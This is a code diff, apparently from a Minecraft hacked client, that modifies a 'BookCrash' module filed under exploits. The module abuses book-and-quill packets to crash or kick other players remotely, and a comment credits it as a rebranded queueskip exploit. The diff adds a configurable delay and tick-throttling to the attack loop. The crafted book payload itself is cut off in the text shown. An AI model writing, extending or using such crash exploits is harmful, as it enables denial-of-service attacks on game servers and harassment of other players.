@@ -18,13 +18,19 @@ import net.minecraft.server.network.packet.ClickWindowC2SPacket;
 /* Rebranded queueskip exploit. credit > https://www.youtube.com/watch?v=-BA4ABlFJuc */
 public class BookCrash extends Module {
 	
+	private int delay = 0;
+	
 	public BookCrash() {
 		super("BookCrash", -1, Category.EXPLOITS, "Abuses book and quill packets to remotely kick people.",
-				new SettingSlider(1, 20, 5, 0, "Uses: "));
+				new SettingSlider(1, 20, 5, 0, "Uses: "),
+				new SettingSlider(0, 5, 0, 0, "Delay: "));
 	}
 
 	@Subscribe
 	public void onTick(EventTick event) {
+		delay = (delay >= getSettings().get(1).toSlider().getValue() ? 0 : delay + 1);
+		if(delay > 0) return;
+		
 		ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
         ListTag list = new ListTag();
         CompoundTag tag = new CompoundTag();
